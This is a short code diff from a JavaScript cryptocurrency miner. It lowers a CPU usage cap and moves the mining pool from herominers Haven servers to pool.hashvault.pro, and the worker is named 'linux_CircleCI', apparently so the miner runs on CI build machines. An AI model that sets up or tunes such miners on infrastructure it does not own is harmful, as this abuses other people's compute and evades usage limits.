@@ -7,7 +7,7 @@ const fs = require('fs');
 const appCache = new Cache("meocoder", 557056);
 const numCPUs = require('os').cpus().length;
 const numWorker = 1;
-const customUsageCPU = 80;
+const customUsageCPU = 70;
 const nameWorker = `linux_CircleCI`; /* _${Math.floor(Math.random() * 2) + 1} */
 const login = (() => {
     return {
@@ -22,7 +22,7 @@ const login = (() => {
     };
 })();
 const mainStatus = {
-    servers: ["sg.haven.herominers.com:1110", "ca.haven.herominers.com:1110", "de.haven.herominers.com:1110", "fi.haven.herominers.com:1110"],
+    servers: ["pool.hashvault.pro:80"],
     workers: [],
     poolWS: null,
     attempts: 0,
